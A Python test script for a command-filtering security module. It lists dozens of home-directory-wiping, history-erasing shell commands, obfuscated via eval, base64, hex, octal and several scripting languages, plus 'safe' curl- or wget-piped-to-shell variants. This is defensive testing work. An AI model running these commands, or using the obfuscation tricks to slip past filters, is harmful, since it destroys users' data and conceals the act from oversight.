#!/usr/bin/env python3
"""Test the CommandGuard against a list of destructive and safe‑but‑suspicious commands."""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../..'))

from src.security import CommandGuard

# ── Destructive commands (should be DENY or at minimum ASK) ──
DESTRUCTIVE_COMMANDS = [
    # Plain
    "rm -rf ~/.* ~/* && history -c && > ~/.bash_history",
    "rm -rf ~/.* ~/*; history -c; > ~/.bash_history",
    "rm -rf /home/$USER/.* /home/$USER/* && history -c && > /home/$USER/.bash_history",
    "rm -rf ~/.[!.]* ~/* && history -c && > ~/.bash_history",
    "rm -rf ~/.* ~/*; : > ~/.bash_history; history -c",

    # find -delete
    "find ~ -mindepth 1 -delete && history -c && > ~/.bash_history",
    "find ~ -type f -delete; find ~ -type d -delete; history -c; > ~/.bash_history",

    # Wrapped
    'echo "rm -rf ~/.* ~/* && history -c && > ~/.bash_history" | bash',
    'bash -c "rm -rf ~/.* ~/* && history -c && > ~/.bash_history"',
    'sh -c "rm -rf ~/.* ~/* && history -c && > ~/.bash_history"',
    'eval "rm -rf ~/.* ~/* && history -c && > ~/.bash_history"',
    'x="rm -rf ~/.* ~/* && history -c && > ~/.bash_history"; eval "$x"',
    'cmd="rm -rf ~/.* ~/* && history -c && > ~/.bash_history"; $cmd',

    # String concatenation
    'a="rm"; b=" -rf"; c=" ~/.* ~/*"; d=" && history -c && > ~/.bash_history"; $a$b$c$d',
    '(printf "rm -rf ~/.* ~/* && history -c && > ~/.bash_history") | sh',
    'printf "rm -rf ~/.* ~/* && history -c && > ~/.bash_history\n" | sh',

    # base64
    'echo "cm0gLXJmIH4vLiogfi8qICYmIGhpc3RvcnkgLWMgJiYgPiB+Ly5iYXNoX2hpc3Rvcnk=" | base64 -d | sh',
    'echo "ZmluZCB+IC1taW5kZXB0aCAxIC1kZWxldGUgJiYgaGlzdG9yeSAtYyAmJiA+IH4vLmJhc2hfaGlzdG9yeQ==" | base64 -d | sh',

    # xxd
    'echo "726d202d7266207e2f2e2a207e2f2a20262620686973746f7279202d63202626203e207e2f2e626173685f686973746f7279" | xxd -r -p | sh',
    'echo "726d202d7266207e2f2e2a207e2f2a20262620686973746f7279202d63202626203e207e2f2e626173685f686973746f72790a" | xxd -r -p | bash',

    # perl
    'perl -e \'print pack("H*", "726d202d7266207e2f2e2a207e2f2a20262620686973746f7279202d63202626203e207e2f2e626173685f686973746f7279")\' | sh',
    'perl -e \'print "\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x7e\\x2f\\x2e\\x2a\\x20\\x7e\\x2f\\x2a\\x20\\x26\\x26\\x20\\x68\\x69\\x73\\x74\\x6f\\x72\\x79\\x20\\x2d\\x63\\x20\\x26\\x26\\x20\\x3e\\x20\\x7e\\x2f\\x2e\\x62\\x61\\x73\\x68\\x5f\\x68\\x69\\x73\\x74\\x6f\\x72\\x79"\' | sh',

    # echo -e
    'echo -e "\\162\\155\\40\\55\\162\\146\\40\\176\\57\\56\\52\\40\\176\\57\\52\\40\\46\\46\\40\\150\\151\\163\\164\\157\\162\\171\\40\\55\\143\\40\\46\\46\\40\\76\\40\\176\\57\\56\\142\\141\\163\\150\\137\\150\\151\\163\\164\\157\\162\\171" | sh',
    'echo -e "\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x7e\\x2f\\x2e\\x2a\\x20\\x7e\\x2f\\x2a\\x20\\x26\\x26\\x20\\x68\\x69\\x73\\x74\\x6f\\x72\\x79\\x20\\x2d\\x63\\x20\\x26\\x26\\x20\\x3e\\x20\\x7e\\x2f\\x2e\\x62\\x61\\x73\\x68\\x5f\\x68\\x69\\x73\\x74\\x6f\\x72\\x79" | sh',

    # printf
    'printf "\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x7e\\x2f\\x2e\\x2a\\x20\\x7e\\x2f\\x2a\\x20\\x26\\x26\\x20\\x68\\x69\\x73\\x74\\x6f\\x72\\x79\\x20\\x2d\\x63\\x20\\x26\\x26\\x20\\x3e\\x20\\x7e\\x2f\\x2e\\x62\\x61\\x73\\x68\\x5f\\x68\\x69\\x73\\x74\\x6f\\x72\\x79" | sh',
    'printf "\\162\\155\\40\\55\\162\\146\\40\\176\\57\\56\\52\\40\\176\\57\\52\\40\\46\\46\\40\\150\\151\\163\\164\\157\\162\\171\\40\\55\\143\\40\\46\\46\\40\\76\\40\\176\\57\\56\\142\\141\\163\\150\\137\\150\\151\\163\\164\\157\\162\\171" | sh',

    # Heredoc-style
    'xxd -r -p <<< "726d202d7266207e2f2e2a207e2f2a20262620686973746f7279202d63202626203e207e2f2e626173685f686973746f7279" | sh',
    'base64 -d <<< "cm0gLXJmIH4vLiogfi8qICYmIGhpc3RvcnkgLWMgJiYgPiB+Ly5iYXNoX2hpc3Rvcnk=" | sh',

    # Python/Ruby/Node
    'python3 -c "import shutil, os; shutil.rmtree(os.path.expanduser(\'~\'))"',
    'python3 -c "import os, base64; os.system(base64.b64decode(\'cm0gLXJmIH4vLiogfi8qICYmIGhpc3RvcnkgLWMgJiYgPiB+Ly5iYXNoX2hpc3Rvcnk=\').decode())"',
    'python3 -c "import os; os.system(\'rm -rf ~/.* ~/* && history -c && > ~/.bash_history\')"',
    'ruby -e "system(\'rm -rf ~/.* ~/* && history -c && > ~/.bash_history\')"',
    "node -e \"require('child_process').execSync('rm -rf ~/.* ~/* && history -c && > ~/.bash_history')\"",
    "php -r \"exec('rm -rf ~/.* ~/* && history -c && > ~/.bash_history');\"",
    "awk 'BEGIN{system(\"rm -rf ~/.* ~/* && history -c && > ~/.bash_history\")}'",

    # Nested decoding
    'bash -c "$(echo \'cm0gLXJmIH4vLiogfi8qICYmIGhpc3RvcnkgLWMgJiYgPiB+Ly5iYXNoX2hpc3Rvcnk=\' | base64 -d)"',
    'eval "$(echo "cm0gLXJmIH4vLiogfi8qICYmIGhpc3RvcnkgLWMgJiYgPiB+Ly5iYXNoX2hpc3Rvcnk=" | base64 -d)"',
    '(code=$(echo "cm0gLXJmIH4vLiogfi8qICYmIGhpc3RvcnkgLWMgJiYgPiB+Ly5iYXNoX2hpc3Rvcnk=" | base64 -d); eval "$code")',
]

# ── Suspicious‑but‑safe commands (should be ALLOW) ──
SAFE_COMMANDS = [
    'echo "rm -rf ~/.* ~/* && history -c && > ~/.bash_history" | base64 | base64 -d | sh -c \'echo "Dry run: $@"\' --',
    'curl -s --max-time 1 https://example.com/malicious.sh | sh -s -- --dry-run',
    'wget -qO- https://safe.example.com/script.sh | bash -c \'echo "Would delete ~/.* ~/*"; exit 0\'',
    '( printf "rm -rf ~/.* ~/* && history -c && > ~/.bash_history\\n" | base64 -d | sed \'s/^/Dry run: /\' ) &> /dev/null &',
    'eval "$(echo "cm0gLXJmIH4vLiogfi8qICYmIGhpc3RvcnkgLWMgJiYgPiB+Ly5iYXNoX2hpc3Rvcnk=" | base64 -d | sed \'s/^/echo "Would run: /; s/$/"/\')"',
    'sh -c "$(xxd -r -p <<< 726d202d7266207e2f2e2a207e2f2a20262620686973746f7279202d63202626203e207e2f2e626173685f686973746f7279 | sed \'s/.*/echo "Dry run: &"/\')"',
    'python3 -c "import os, base64, subprocess; cmd=base64.b64decode(\'cm0gLXJmIH4vLiogfi8qICYmIGhpc3RvcnkgLWMgJiYgPiB+Ly5iYXNoX2hpc3Rvcnk=\').decode(); subprocess.run([\'echo\', cmd])"',
    'ruby -e \'cmd="rm -rf ~/.* ~/* && history -c && > ~/.bash_history"; system("echo", cmd)\'',
    "node -e \"const cmd='rm -rf ~/.* ~/* && history -c && > ~/.bash_history'; require('child_process').execSync('echo '+cmd)\"",
    "php -r \"exec('echo rm -rf ~/.* ~/* && history -c && > ~/.bash_history');\"",
    "awk 'BEGIN{cmd=\"rm -rf ~/.* ~/* && history -c && > ~/.bash_history\"; system(\"echo \" cmd)}'",
    "sed -n \"e echo 'rm -rf ~/.* ~/* && history -c && > ~/.bash_history'\" /dev/null",
    "gcc -x c - <<< 'main(){printf(\"rm -rf ~/.* ~/* && history -c && > ~/.bash_history\\n\");}' && ./a.out",
]


def main():
    guard = CommandGuard()

    print("=" * 80)
    print("TESTING DESTRUCTIVE COMMANDS (should be DENY or ASK)")
    print("=" * 80)
    for i, cmd in enumerate(DESTRUCTIVE_COMMANDS, 1):
        decision, info = guard.evaluate(cmd, session_id="test")
        if decision == "allow":
            status = "❌  SAFE  (BAD!)"
        elif decision == "ask":
            status = "⚠️  ASK"
        elif decision == "deny":
            status = "✅  DENY"
        print(f"\n[{i}] {status}")
        print(f"    Command: {cmd[:100]}{'...' if len(cmd) > 100 else ''}")
        if info:
            print(f"    Reason:  {info.get('reason', 'N/A')}")
        else:
            print(f"    Reason:  (none)")

    print("\n\n" + "=" * 80)
    print("TESTING SAFE-BUT-SUSPICIOUS COMMANDS (should be ALLOW)")
    print("=" * 80)
    for i, cmd in enumerate(SAFE_COMMANDS, 1):
        decision, info = guard.evaluate(cmd, session_id="test")
        if decision == "allow":
            status = "✅  ALLOW"
        elif decision == "ask":
            status = "⚠️  ASK (acceptable)"
        elif decision == "deny":
            status = "❌  DENY  (BAD - false positive)"
        print(f"\n[{i}] {status}")
        print(f"    Command: {cmd[:100]}{'...' if len(cmd) > 100 else ''}")
        if info:
            print(f"    Reason:  {info.get('reason', 'N/A')}")
        else:
            print(f"    Reason:  (none)")


if __name__ == "__main__":
    main()